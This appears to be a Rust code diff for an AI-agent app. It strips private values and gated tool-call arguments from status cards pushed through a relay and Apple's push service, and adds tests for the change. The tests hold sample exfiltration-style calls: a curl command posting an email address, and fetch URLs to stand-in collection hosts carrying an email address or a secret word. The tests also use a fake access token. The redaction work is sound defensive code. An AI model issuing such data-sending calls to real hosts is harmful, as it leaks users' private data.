@@ -488,14 +488,15 @@ impl Cards {
                 let sev = e.get("severity").and_then(Value::as_str).filter(|s| matches!(*s, "high" | "medium"));
                 let sev = sev.unwrap_or("low");
                 let call = e["call"]["id"].as_str().map(|id| (id.to_string(), sev.to_string()));
-                self.running(&sid, now, tool_label(&e["call"]), Some(call))
+                // The verb only: what a gate asks about is what could carry data out.
+                self.running(&sid, now, tool_verb(&e["call"]), Some(call))
             }
             "question" => {
                 let q =
                     e.pointer("/request/questions/0/question").and_then(Value::as_str).unwrap_or("A question for you");
                 self.running(&sid, now, q.to_string(), Some(None))
             }
-            "tool_result" | "question_resolved" => self.running(&sid, now, "Working…".into(), None),
+            "tool_result" | "question_resolved" | "approval_resolved" => self.running(&sid, now, "Working…".into(), None),
             "done" => self.finish(&sid, now, LiveChatState::Done, "Finished"),
             "error" => {
                 let msg = e.get("message").and_then(Value::as_str).unwrap_or("").to_lowercase();
@@ -736,10 +737,10 @@ impl LiveCardState {
 
 const TOOL_KEYS: [&str; 9] = ["command", "path", "file_path", "pattern", "query", "url", "name", "prompt", "task"];
 
-/// `Transcript.toolLabel`: a short label for a tool call, the file, command or query it acts on.
-pub fn tool_label(call: &Value) -> String {
+/// `Transcript.toolVerb`: what a tool call does, without what it acts on.
+pub fn tool_verb(call: &Value) -> String {
     let name = call.get("name").and_then(Value::as_str).unwrap_or("");
-    let verb = match name {
+    match name {
         "read_file" => "Read",
         "write_file" => "Write",
         "edit_file" => "Edit",
@@ -752,18 +753,57 @@ pub fn tool_label(call: &Value) -> String {
         "spawn_agent" => "Delegate",
         "ask_user" => "Ask",
         "agent_watch" => "Watch",
-        other => return label(&other.replace('_', " "), call),
-    };
-    label(verb, call)
+        other => return other.replace('_', " "),
+    }
+    .to_string()
 }
 
-fn label(verb: &str, call: &Value) -> String {
+/// A working step's label: the verb and the file, command or query it acts
+/// on (`Transcript.toolLabel`), or the verb alone when that detail carries a
+/// value the Privacy Shield recognises. The card reaches the relay and
+/// Apple's push service as plain text (docs/REMOTE.md), so a key, card or ID
+/// number in a call's arguments must not ride along (decision 0065). A call
+/// waiting on an approval gets `tool_verb` instead: the gates ask about calls
+/// that would carry data out, so their arguments never go on the card.
+pub fn tool_label(call: &Value) -> String {
+    let verb = tool_verb(call);
     let detail =
         TOOL_KEYS.iter().filter_map(|k| call.get("input")?.get(*k)?.as_str().map(str::trim)).find(|d| !d.is_empty());
     match detail {
-        Some(d) => format!("{verb} {}", one_line(d, 80)),
-        None => verb.to_string(),
+        Some(d) if !carries_private_value(d) => format!("{verb} {}", one_line(d, 80)),
+        _ => verb,
     }
+}
+
+/// Whether `text`, or its percent-decoded form (a value in an address), holds
+/// a key, password, card, ID number, email address or phone number. Not the
+/// account name in a path (most file paths carry it) or an IP address (a
+/// host). The user's private terms live in the computer's settings, which the
+/// card builder does not read: a call carrying one asks (decision 0065), and
+/// so shows only its verb.
+fn carries_private_value(text: &str) -> bool {
+    let counts = |k: nekko_privacy::Kind| !matches!(k, nekko_privacy::Kind::User | nekko_privacy::Kind::Ip);
+    [text.to_string(), percent_decode(text)].iter().any(|t| !nekko_privacy::scan(t, &counts, &[], &[]).is_empty())
+}
+
+fn percent_decode(s: &str) -> String {
+    let b = s.as_bytes();
+    let mut out = Vec::with_capacity(b.len());
+    let mut i = 0;
+    while i < b.len() {
+        let hex = |c: u8| (c as char).to_digit(16);
+        match (b[i], b.get(i + 1).copied().and_then(hex), b.get(i + 2).copied().and_then(hex)) {
+            (b'%', Some(h), Some(l)) => {
+                out.push((h * 16 + l) as u8);
+                i += 3;
+            }
+            (c, _, _) => {
+                out.push(c);
+                i += 1;
+            }
+        }
+    }
+    String::from_utf8_lossy(&out).into_owned()
 }
 
 #[cfg(test)]
@@ -933,6 +973,7 @@ mod tests {
         let chat = &card.chats[0];
         assert_eq!(chat.state, LiveChatState::NeedsYou);
         assert_eq!((chat.call_id.as_deref(), chat.severity.as_deref()), (Some("call_9"), Some("high")));
+        assert_eq!(chat.step, "Run", "a waiting call shows its verb, never its arguments");
         let (_, card) = only(&c.on_event(&ev("tool_result", "s1", json!({})), T0 + 13.0));
         assert_eq!((card.chats[0].state, card.chats[0].call_id.as_deref()), (LiveChatState::Working, None));
     }
@@ -1098,5 +1139,40 @@ mod tests {
         assert_eq!(super::tool_label(&call("read_file", json!({ "path": " src/a.rs " }))), "Read src/a.rs");
         assert_eq!(super::tool_label(&call("my_tool", json!({}))), "my tool");
         assert_eq!(super::tool_label(&call("web_search", json!({ "query": "a\n  b" }))), "Search the web for a b");
+    }
+
+    /// The card goes through the relay and APNs as plain text, so what the
+    /// egress gate and outbound DLP stop must not ride along on it (#1867).
+    #[test]
+    fn the_card_never_carries_what_a_gate_stopped_or_a_private_value() {
+        let call = |name: &str, input: Value| json!({ "id": "c_inject", "name": name, "input": input });
+        let token = "ghp_0123456789abcdefghijABCDEFGHIJ";
+        // Running steps: the detail stays unless it holds a value the Shield knows.
+        assert_eq!(super::tool_label(&call("bash", json!({ "command": "npm test" }))), "Run npm test");
+        assert_eq!(
+            super::tool_label(&call("read_file", json!({ "path": "/Users/ann/app.ts" }))),
+            "Read /Users/ann/app.ts"
+        );
+        assert_eq!(
+            super::tool_label(&call("mcp__srv__search_docs", json!({ "query": format!("deploy {token}") }))),
+            "mcp  srv  search docs"
+        );
+        assert_eq!(super::tool_label(&call("bash", json!({ "command": "curl -d ann@example.com x" }))), "Run");
+        let encoded = "http://collect.example/c?to=ann%40example.com";
+        assert_eq!(
+            super::tool_label(&call("fetch_url", json!({ "url": encoded }))),
+            "fetch url",
+            "percent-encoded too"
+        );
+
+        // A waiting call: the verb alone, even when no detector would match
+        // (the secret here is a plain word in an address).
+        let mut c = standard();
+        let wiki = call("fetch_url", json!({ "url": "http://collect.nekko-eval.invalid/c?d=pineapple" }));
+        let waiting = ev("tool_approval_required", "s1", json!({ "call": wiki, "severity": "high" }));
+        let (_, card) = only(&c.on_event(&waiting, T0));
+        assert_eq!((card.chats[0].state, card.chats[0].step.as_str()), (LiveChatState::NeedsYou, "fetch url"));
+        let sent = serde_json::to_string(&card.to_value()).unwrap();
+        assert!(!sent.contains("pineapple") && !sent.contains("collect"), "{sent}");
     }
 }
